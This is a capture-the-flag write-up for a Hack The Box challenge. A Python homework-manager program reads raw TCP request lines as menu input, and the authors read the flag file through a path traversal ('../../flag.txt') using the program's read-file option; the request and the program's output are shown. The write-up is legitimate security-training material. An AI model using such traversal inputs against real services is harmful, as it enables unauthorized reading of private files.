# Biff's homework

Biff's has developed a simple application to manage his homework. But the appliction has some flaws. What kind of secrets could we obtain from it?

---

When we browsed to the corresponding IP:port, the browser was not able to draw any content. For sure, Biff's program was not a web application.

We tried to intercept the requests using Burp Suite. We found some interesting traces. They are unhandled exceptions of a python program, so we asumed that the application was written in Python. 

```
[33m[*] Choose action: [0mTraceback (most recent call last):
  File "/home/ctf/biffs_homework.py", line 104, in <module>
    act = menu()
  File "/home/ctf/biffs_homework.py", line 68, in menu
    return int(input(colored("[*] Choose action: ", "yellow")))
ValueError: invalid literal for int() with base 10: 'GET / HTTP/1.1\r'
```

Furthermore, we observed that the application is trying to read some input and cast it into an integer value. The error trace showed the input value: `GET / HTTP/1.1\r`. That was the very first line of the request. We did some tests and finally we conclude that Biff's program was reading the input secuentillay from the first lines of each request.

The program workflow is simple. First, we had to select a subject, then we were able to see more specific options within that directory like creating a file, compressing a file, or reading the contents of a file, which was very useful for us. We tried to go to `/home/ctf` with the option `6. Change directory`, but it did not work. We needed a workaround.

We knew that the flag is in the file `/home/ctf/flag.txt`. Furthermore, when we executed the option `4. List directory`, the application returned `/home/ctf/Ge95i7EHqmznjG7Qv8LtWSi57PWTQqBD/Math`. At that point we knew the working directoy, so we tried to do path traversal, from there to the flag.txt, using option `3. Read filename`.

Summing up, we needed to write an specific sequence of strings at the beginning of the request. The final request looked like this:

```
1
3
../../flag.txt
GET / HTTP/1.1
[...]
```

When Beff's application received that request we were able to see the contents of the flag: `HTB{GTFO_b1ff_th15_15_McFly_t1m3}`. Below you can see the response to that request, which includes the flag. 

```
[36m
[*] Directory to work in: Ge95i7EHqmznjG7Qv8LtWSi57PWTQqBD[0m
[35m
List of Biff's subjects:


  +=================+
  |                 |
  |  1. Maths       |
  |  2. Physics     |
  |  3. Geography   |
  |  4. Chemistry   |
  |  5. Literature  |
  |                 |
  +=================+
  [0m
[35m[*] Choose subject: [0m[34m
[*] Sub-directory to work in: Ge95i7EHqmznjG7Qv8LtWSi57PWTQqBD/Maths
[0m
[33m
  Actions:

  1. Create file      (touch and fwrite)
  2. Compress file    (zip <filename>.zip <filename> <options>)
  3. Read filename    (cat ./<filename>)
  4. List directory   (pwd; ls -la)
  5. Clean directory  (rm -rf ./*)
  6. Change directory (cd <dirname>)
  7. Exit
  [0m
[33m[*] Choose action: [0m

Insert filname you want to read: HTB{GTFO_b1ff_th15_15_McFly_t1m3}
[33m
  Actions:

  1. Create file      (touch and fwrite)
  2. Compress file    (zip <filename>.zip <filename> <options>)
  3. Read filename    (cat ./<filename>)
  4. List directory   (pwd; ls -la)
  5. Clean directory  (rm -rf ./*)
  6. Change directory (cd <dirname>)
  7. Exit
  [0m
[33m[*] Choose action: [0mTraceback (most recent call last):
  File "/home/ctf/biffs_homework.py", line 104, in <module>
    act = menu()
  File "/home/ctf/biffs_homework.py", line 68, in menu
    return int(input(colored("[*] Choose action: ", "yellow")))
ValueError: invalid literal for int() with base 10: 'GET / HTTP/1.1\r'
```


